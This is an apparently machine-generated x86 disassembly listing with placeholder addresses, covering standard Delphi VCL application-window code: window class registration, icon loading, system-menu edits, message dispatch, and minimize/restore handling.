je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_453144
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_453144
sub_4531ac
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c4b8
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403470
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_454884
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_424348
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_424718
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45501c
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c1a8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_454a7c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c1d0
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4084e4
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_40410c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_4551f8
mov eax ebx
call sub_455bbc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4534b4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_453395
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_455bcc
mov [ esp + 0x4 ] esi
mov [ esp ] sub_454884
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_454a7c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_455418
xor edx edx
mov eax esi
call sub_454d94
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c504
push esi
push sub_4538e8
mov eax esi
call sub_454670
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40575c
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403164
mov eax [ esi + 0x90 ]
call sub_403164
mov eax [ esi + 0x98 ]
call sub_403164
test bl bl
jle r-xdata
call sub_41d5e0
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4534b4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_453655
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45365c
lea eax [ ebp - 0x2c ]
call sub_403e9c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_453a34
call sub_41d548
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40435c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406a88
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403e9c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_454138
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_454138
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_453664
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_452398
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4536c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4169bc
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43b8e8
cmp ebx eax
je r-xdata
sub_453734
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4536c4
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_416b18
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45384c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_416b18
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4538e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c470
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4528a4
mov eax [ rw-data ]
call sub_452eec
sub_453940
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45399d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4539a4
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404094
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4539ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4539e8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_454138
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_453a34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4035ec#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4538e8
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_454b54
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_416b18
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43b8e8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455a80
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_454670
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_454614
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43b8e8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454138
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_452eec
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4539ac
pop ecx
jmp [ eax * 4 + jump_table_453ad8 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43b8e8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4544ec
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4401ac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453940
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41c318
jmp r-xdata
xor eax eax
call sub_44b86c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43b8e8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_4362b4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454154
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4539ac
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4510ec
jmp r-xdata
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
push ebp
call sub_4539e8
pop ecx
jmp r-xdata
push ebp
call sub_4539ac
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45384c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454204
jmp r-xdata
jmp r-xdata
call sub_42b194
call sub_42b274
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45383c
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45384c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453844
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44b71c
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
call sub_44b7d0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4539ac
pop ecx
jmp r-xdata
call sub_42b194
call sub_42b2d0
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40ce18
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_454154
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45383c
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45316c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43b8e8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43b8e8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_454204
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45316c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43b8e8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45384c
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43b8e8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_44ee78
mov eax [ ebx + 0x44 ]
call sub_451294
sub_454304
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_454340
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403ef0
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403f8c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45438c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_4543b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_454400
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_431fec
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43b8e8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_4544b8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_455418
